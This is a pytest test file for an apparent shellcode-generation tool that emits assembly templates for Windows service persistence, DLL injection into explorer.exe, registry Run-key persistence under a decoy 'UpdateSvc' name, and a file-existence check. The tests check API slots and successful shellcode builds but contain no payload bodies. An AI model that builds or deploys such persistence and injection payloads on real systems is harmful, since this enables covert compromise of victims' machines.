def test_service_persist_closehandle_slot(service_persist_layout, svc_config):
    from emitera.payload_templates.service_persist import ServicePersistTemplate
    t = ServicePersistTemplate()
    asm = t.emit(service_persist_layout, svc_config)
    assert service_persist_layout.slot("CloseServiceHandle").ebp_ref in asm


def test_service_persist_variable_slots(service_persist_layout, svc_config):
    from emitera.payload_templates.service_persist import ServicePersistTemplate
    t = ServicePersistTemplate()
    asm = t.emit(service_persist_layout, svc_config)
    assert service_persist_layout.slot("scm_handle").ebp_ref in asm
    assert service_persist_layout.slot("svc_handle").ebp_ref in asm


def test_service_persist_string_slots(service_persist_layout, svc_config):
    from emitera.payload_templates.service_persist import ServicePersistTemplate
    t = ServicePersistTemplate()
    asm = t.emit(service_persist_layout, svc_config)
    assert service_persist_layout.slot("service_name").ebp_ref in asm
    assert service_persist_layout.slot("dst_path").ebp_ref in asm


def test_service_persist_no_hardcoded_offsets(service_persist_layout, svc_config):
    from emitera.payload_templates.service_persist import ServicePersistTemplate
    import re
    t = ServicePersistTemplate()
    asm = t.emit(service_persist_layout, svc_config)
    known_refs = {s.ebp_ref for s in service_persist_layout.all_slots()}
    for ref in re.findall(r'\[ebp-0x[0-9a-f]+\]', asm):
        assert ref in known_refs, f"Hardcoded offset {ref} not in layout"


def test_service_persist_service_all_access(service_persist_layout, svc_config):
    from emitera.payload_templates.service_persist import ServicePersistTemplate
    t = ServicePersistTemplate()
    asm = t.emit(service_persist_layout, svc_config)
    assert "SERVICE_ALL_ACCESS" in asm


def test_service_persist_auto_start(service_persist_layout, svc_config):
    from emitera.payload_templates.service_persist import ServicePersistTemplate
    t = ServicePersistTemplate()
    asm = t.emit(service_persist_layout, svc_config)
    assert "SERVICE_AUTO_START" in asm


def test_service_persist_rejects_unquoted_spaces(service_persist_layout):
    from emitera.payload_templates.service_persist import ServicePersistTemplate
    from emitera.payload_templates.base import TemplateConfig
    t = ServicePersistTemplate()
    config = TemplateConfig(
        service_name="TestSvc",
        dst_path="C:\\Program Files\\svc.exe",
    )
    with pytest.raises(ValueError, match="spaces"):
        t.emit(service_persist_layout, config)


class TestServicePersistProbeSlots:
    def test_discovers_api_slots(self, svc_config):
        from emitera.payload_templates.service_persist import ServicePersistTemplate
        t = ServicePersistTemplate()
        slots = t.probe_slots(svc_config)
        for api in [
            "OpenSCManagerA", "CreateServiceA", "StartServiceA",
            "CloseServiceHandle",
        ]:
            assert api in slots, f"probe_slots did not discover {api}"


class TestServicePersistAutoDerive:
    def test_full_build_assembles(self, manifest_dir, tmp_path):
        from emitera.build import build
        from emitera.payload_templates.base import TemplateConfig
        config = TemplateConfig(
            service_name="TestSvc",
            dst_path="C:\\svc.exe",
        )
        result = build(
            str(manifest_dir / "service_persist.yaml"),
            config=config,
            out_dir=str(tmp_path),
        )
        assert result.shellcode_bytes is not None
        assert len(result.shellcode_bytes) > 0


# ---------------------------------------------------------------------------
# DLL Injection
# ---------------------------------------------------------------------------

@pytest.fixture
def di_config():
    from emitera.payload_templates.base import TemplateConfig
    return TemplateConfig(
        process_name="explorer.exe",
        dst_path="C:\\Windows\\Temp\\payload.dll",
    )


def test_dll_inject_snapshot_slot(dll_inject_layout, di_config):
    from emitera.payload_templates.dll_inject import DllInjectTemplate
    t = DllInjectTemplate()
    asm = t.emit(dll_inject_layout, di_config)
    assert dll_inject_layout.slot("CreateToolhelp32Snapshot").ebp_ref in asm


def test_dll_inject_openprocess_slot(dll_inject_layout, di_config):
    from emitera.payload_templates.dll_inject import DllInjectTemplate
    t = DllInjectTemplate()
    asm = t.emit(dll_inject_layout, di_config)
    assert dll_inject_layout.slot("OpenProcess").ebp_ref in asm


def test_dll_inject_virtualalloc_slot(dll_inject_layout, di_config):
    from emitera.payload_templates.dll_inject import DllInjectTemplate
    t = DllInjectTemplate()
    asm = t.emit(dll_inject_layout, di_config)
    assert dll_inject_layout.slot("VirtualAllocEx").ebp_ref in asm


def test_dll_inject_writemem_slot(dll_inject_layout, di_config):
    from emitera.payload_templates.dll_inject import DllInjectTemplate
    t = DllInjectTemplate()
    asm = t.emit(dll_inject_layout, di_config)
    assert dll_inject_layout.slot("WriteProcessMemory").ebp_ref in asm


def test_dll_inject_createremotethread_slot(dll_inject_layout, di_config):
    from emitera.payload_templates.dll_inject import DllInjectTemplate
    t = DllInjectTemplate()
    asm = t.emit(dll_inject_layout, di_config)
    assert dll_inject_layout.slot("CreateRemoteThread").ebp_ref in asm


def test_dll_inject_getmodulehandle_slot(dll_inject_layout, di_config):
    from emitera.payload_templates.dll_inject import DllInjectTemplate
    t = DllInjectTemplate()
    asm = t.emit(dll_inject_layout, di_config)
    assert dll_inject_layout.slot("GetModuleHandleA").ebp_ref in asm


def test_dll_inject_getprocaddress_slot(dll_inject_layout, di_config):
    from emitera.payload_templates.dll_inject import DllInjectTemplate
    t = DllInjectTemplate()
    asm = t.emit(dll_inject_layout, di_config)
    assert dll_inject_layout.slot("GetProcAddress").ebp_ref in asm


def test_dll_inject_variable_slots(dll_inject_layout, di_config):
    from emitera.payload_templates.dll_inject import DllInjectTemplate
    t = DllInjectTemplate()
    asm = t.emit(dll_inject_layout, di_config)
    for var in ("snapshot_handle", "target_pid", "proc_handle",
                "remote_buf", "thread_handle"):
        assert dll_inject_layout.slot(var).ebp_ref in asm, f"missing var {var}"


def test_dll_inject_string_slots(dll_inject_layout, di_config):
    from emitera.payload_templates.dll_inject import DllInjectTemplate
    t = DllInjectTemplate()
    asm = t.emit(dll_inject_layout, di_config)
    for s in ("process_name", "dll_path", "kernel32_str", "loadlib_str"):
        assert dll_inject_layout.slot(s).ebp_ref in asm, f"missing string {s}"


def test_dll_inject_no_hardcoded_offsets(dll_inject_layout, di_config):
    from emitera.payload_templates.dll_inject import DllInjectTemplate
    import re
    t = DllInjectTemplate()
    asm = t.emit(dll_inject_layout, di_config)
    known_refs = {s.ebp_ref for s in dll_inject_layout.all_slots()}
    for ref in re.findall(r'\[ebp-0x[0-9a-f]+\]', asm):
        assert ref in known_refs, f"Hardcoded offset {ref} not in layout"


def test_dll_inject_enum_loop(dll_inject_layout, di_config):
    from emitera.payload_templates.dll_inject import DllInjectTemplate
    t = DllInjectTemplate()
    asm = t.emit(dll_inject_layout, di_config)
    assert "di_enum_loop:" in asm
    assert "di_strcmp:" in asm
    assert "di_found:" in asm
    assert "di_done:" in asm


def test_dll_inject_case_insensitive_compare(dll_inject_layout, di_config):
    from emitera.payload_templates.dll_inject import DllInjectTemplate
    t = DllInjectTemplate()
    asm = t.emit(dll_inject_layout, di_config)
    assert "or   al, 0x20" in asm
    assert "or   cl, 0x20" in asm


def test_dll_inject_process_all_access(dll_inject_layout, di_config):
    from emitera.payload_templates.dll_inject import DllInjectTemplate
    t = DllInjectTemplate()
    asm = t.emit(dll_inject_layout, di_config)
    assert "PROCESS_ALL_ACCESS" in asm


def test_dll_inject_snapshot_closed_on_miss(dll_inject_layout, di_config):
    from emitera.payload_templates.dll_inject import DllInjectTemplate
    t = DllInjectTemplate()
    asm = t.emit(dll_inject_layout, di_config)
    lines = asm.splitlines()
    cs_idx = next(i for i, l in enumerate(lines) if "di_cleanup_snap:" in l)
    done_jmp = next(i for i, l in enumerate(lines) if "di_done" in l and i > cs_idx)
    between = "\n".join(lines[cs_idx:done_jmp])
    close_ref = dll_inject_layout.slot("CloseHandle").ebp_ref
    assert close_ref in between


def test_dll_inject_error_checks(dll_inject_layout, di_config):
    from emitera.payload_templates.dll_inject import DllInjectTemplate
    t = DllInjectTemplate()
    asm = t.emit(dll_inject_layout, di_config)
    for label in ("di_done", "di_close_proc"):
        assert f"jz   {label}" in asm, f"missing error jump to {label}"


class TestDllInjectProbeSlots:
    def test_discovers_api_slots(self, di_config):
        from emitera.payload_templates.dll_inject import DllInjectTemplate
        t = DllInjectTemplate()
        slots = t.probe_slots(di_config)
        for api in [
            "CreateToolhelp32Snapshot", "Process32First", "Process32Next",
            "OpenProcess", "VirtualAllocEx", "WriteProcessMemory",
            "GetModuleHandleA", "GetProcAddress", "CreateRemoteThread",
            "CloseHandle",
        ]:
            assert api in slots, f"probe_slots did not discover {api}"


class TestDllInjectAutoDerive:
    def test_full_build_assembles(self, manifest_dir, tmp_path):
        from emitera.build import build
        from emitera.payload_templates.base import TemplateConfig
        config = TemplateConfig(
            process_name="explorer.exe",
            dst_path="C:\\payload.dll",
        )
        result = build(
            str(manifest_dir / "dll_inject.yaml"),
            config=config,
            out_dir=str(tmp_path),
        )
        assert result.shellcode_bytes is not None
        assert len(result.shellcode_bytes) > 0


# ---------------------------------------------------------------------------
# Registry Run-Key Persistence
# ---------------------------------------------------------------------------

@pytest.fixture
def rp_config():
    from emitera.payload_templates.base import TemplateConfig
    return TemplateConfig(
        service_name="UpdateSvc",
        dst_path="C:\\Windows\\Temp\\svc.exe",
    )


def test_registry_persist_regopen_slot(registry_persist_layout, rp_config):
    from emitera.payload_templates.registry_persist import RegistryPersistTemplate
    t = RegistryPersistTemplate()
    asm = t.emit(registry_persist_layout, rp_config)
    assert registry_persist_layout.slot("RegOpenKeyExA").ebp_ref in asm


def test_registry_persist_regset_slot(registry_persist_layout, rp_config):
    from emitera.payload_templates.registry_persist import RegistryPersistTemplate
    t = RegistryPersistTemplate()
    asm = t.emit(registry_persist_layout, rp_config)
    assert registry_persist_layout.slot("RegSetValueExA").ebp_ref in asm


def test_registry_persist_regclose_slot(registry_persist_layout, rp_config):
    from emitera.payload_templates.registry_persist import RegistryPersistTemplate
    t = RegistryPersistTemplate()
    asm = t.emit(registry_persist_layout, rp_config)
    assert registry_persist_layout.slot("RegCloseKey").ebp_ref in asm


def test_registry_persist_variable_slot(registry_persist_layout, rp_config):
    from emitera.payload_templates.registry_persist import RegistryPersistTemplate
    t = RegistryPersistTemplate()
    asm = t.emit(registry_persist_layout, rp_config)
    assert registry_persist_layout.slot("reg_handle").ebp_ref in asm


def test_registry_persist_string_slots(registry_persist_layout, rp_config):
    from emitera.payload_templates.registry_persist import RegistryPersistTemplate
    t = RegistryPersistTemplate()
    asm = t.emit(registry_persist_layout, rp_config)
    for s in ("reg_subkey", "reg_value_name", "dst_path"):
        assert registry_persist_layout.slot(s).ebp_ref in asm, f"missing string {s}"


def test_registry_persist_no_hardcoded_offsets(registry_persist_layout, rp_config):
    from emitera.payload_templates.registry_persist import RegistryPersistTemplate
    import re
    t = RegistryPersistTemplate()
    asm = t.emit(registry_persist_layout, rp_config)
    known_refs = {s.ebp_ref for s in registry_persist_layout.all_slots()}
    for ref in re.findall(r'\[ebp-0x[0-9a-f]+\]', asm):
        assert ref in known_refs, f"Hardcoded offset {ref} not in layout"


def test_registry_persist_hkcu(registry_persist_layout, rp_config):
    from emitera.payload_templates.registry_persist import RegistryPersistTemplate
    t = RegistryPersistTemplate()
    asm = t.emit(registry_persist_layout, rp_config)
    assert "HKEY_CURRENT_USER" in asm


def test_registry_persist_reg_sz(registry_persist_layout, rp_config):
    from emitera.payload_templates.registry_persist import RegistryPersistTemplate
    t = RegistryPersistTemplate()
    asm = t.emit(registry_persist_layout, rp_config)
    assert "REG_SZ" in asm


def test_registry_persist_error_check(registry_persist_layout, rp_config):
    from emitera.payload_templates.registry_persist import RegistryPersistTemplate
    t = RegistryPersistTemplate()
    asm = t.emit(registry_persist_layout, rp_config)
    assert "jnz  rp_done" in asm


def test_registry_persist_cbdata_matches_slot(registry_persist_layout, rp_config):
    from emitera.payload_templates.registry_persist import RegistryPersistTemplate
    t = RegistryPersistTemplate()
    asm = t.emit(registry_persist_layout, rp_config)
    slot_size = registry_persist_layout.slot("dst_path").size
    assert f"cbData = {slot_size}" in asm


def test_registry_persist_service_name_override(manifest_dir, tmp_path):
    from emitera.build import build
    from emitera.payload_templates.base import TemplateConfig
    config = TemplateConfig(
        service_name="CustomVal",
        dst_path="C:\\Windows\\Temp\\svc.exe",
    )
    result = build(
        str(manifest_dir / "registry_persist.yaml"),
        config=config,
        out_dir=str(tmp_path),
        assemble=False,
    )
    assert "CustomVal" in result.asm
    assert "UpdateSvc" not in result.asm


class TestRegistryPersistProbeSlots:
    def test_discovers_api_slots(self, rp_config):
        from emitera.payload_templates.registry_persist import RegistryPersistTemplate
        t = RegistryPersistTemplate()
        slots = t.probe_slots(rp_config)
        for api in ["RegOpenKeyExA", "RegSetValueExA", "RegCloseKey"]:
            assert api in slots, f"probe_slots did not discover {api}"


class TestRegistryPersistAutoDerive:
    def test_full_build_assembles(self, manifest_dir, tmp_path):
        from emitera.build import build
        from emitera.payload_templates.base import TemplateConfig
        config = TemplateConfig(
            service_name="UpdateSvc",
            dst_path="C:\\Windows\\Temp\\svc.exe",
        )
        result = build(
            str(manifest_dir / "registry_persist.yaml"),
            config=config,
            out_dir=str(tmp_path),
        )
        assert result.shellcode_bytes is not None
        assert len(result.shellcode_bytes) > 0


# ---------------------------------------------------------------------------
# Check Path (Primitive)
# ---------------------------------------------------------------------------

@pytest.fixture
def cp_config():
    from emitera.payload_templates.base import TemplateConfig
    return TemplateConfig(
        dst_path="C:\\Windows\\System32\\cmd.exe",
    )


def test_check_path_getfileattr_slot(check_path_layout, cp_config):
    from emitera.payload_templates.check_path import CheckPathTemplate
    t = CheckPathTemplate()
    asm = t.emit(check_path_layout, cp_config)
    assert check_path_layout.slot("GetFileAttributesA").ebp_ref in asm


def test_check_path_variable_slot(check_path_layout, cp_config):
    from emitera.payload_templates.check_path import CheckPathTemplate
    t = CheckPathTemplate()
    asm = t.emit(check_path_layout, cp_config)
    assert check_path_layout.slot("path_attrs").ebp_ref in asm


def test_check_path_string_slot(check_path_layout, cp_config):
    from emitera.payload_templates.check_path import CheckPathTemplate
    t = CheckPathTemplate()
    asm = t.emit(check_path_layout, cp_config)
    assert check_path_layout.slot("check_path").ebp_ref in asm


def test_check_path_no_hardcoded_offsets(check_path_layout, cp_config):
    from emitera.payload_templates.check_path import CheckPathTemplate
    import re
    t = CheckPathTemplate()
    asm = t.emit(check_path_layout, cp_config)
    known_refs = {s.ebp_ref for s in check_path_layout.all_slots()}
    for ref in re.findall(r'\[ebp-0x[0-9a-f]+\]', asm):
        assert ref in known_refs, f"Hardcoded offset {ref} not in layout"


def test_check_path_branches(check_path_layout, cp_config):
    from emitera.payload_templates.check_path import CheckPathTemplate
    t = CheckPathTemplate()
    asm = t.emit(check_path_layout, cp_config)
    assert "cp_present:" in asm
    assert "cp_missing:" in asm
    assert "cp_done:" in asm
    assert "je   cp_missing" in asm


def test_check_path_invalid_file_attributes(check_path_layout, cp_config):
    from emitera.payload_templates.check_path import CheckPathTemplate
    t = CheckPathTemplate()
    asm = t.emit(check_path_layout, cp_config)
    assert "INVALID_FILE_ATTRIBUTES" in asm
    assert "cmp  eax, 0xFFFFFFFF" in asm


def test_check_path_stores_result(check_path_layout, cp_config):
    from emitera.payload_templates.check_path import CheckPathTemplate
    t = CheckPathTemplate()
    asm = t.emit(check_path_layout, cp_config)
    attrs_ref = check_path_layout.slot("path_attrs").ebp_ref
    assert attrs_ref in asm


class TestCheckPathProbeSlots:
    def test_discovers_api_slot(self, cp_config):
        from emitera.payload_templates.check_path import CheckPathTemplate
        t = CheckPathTemplate()
        slots = t.probe_slots(cp_config)
        assert "GetFileAttributesA" in slots

    def test_discovers_variable_slot(self, cp_config):
        from emitera.payload_templates.check_path import CheckPathTemplate
        t = CheckPathTemplate()
        slots = t.probe_slots(cp_config)
        assert "path_attrs" in slots

    def test_discovers_string_slot(self, cp_config):
        from emitera.payload_templates.check_path import CheckPathTemplate
        t = CheckPathTemplate()
        slots = t.probe_slots(cp_config)
        assert "check_path" in slots


class TestCheckPathAutoDerive:
    def test_full_build_assembles(self, manifest_dir, tmp_path):
        from emitera.build import build
        from emitera.payload_templates.base import TemplateConfig
        config = TemplateConfig(
            dst_path="C:\\Windows\\System32\\cmd.exe",
        )
        result = build(
            str(manifest_dir / "check_path.yaml"),
            config=config,
            out_dir=str(tmp_path),
        )
        assert result.shellcode_bytes is not None
        assert len(result.shellcode_bytes) > 0

    def test_dst_override_reaches_check_path(self, manifest_dir, tmp_path):
        from emitera.build import build
        from emitera.payload_templates.base import TemplateConfig
        config = TemplateConfig(
            dst_path="C:\\custom\\target.exe",
        )
        result = build(
            str(manifest_dir / "check_path.yaml"),
            config=config,
            out_dir=str(tmp_path),
            assemble=False,
        )
        assert "C:\\custom\\target.exe" in result.asm
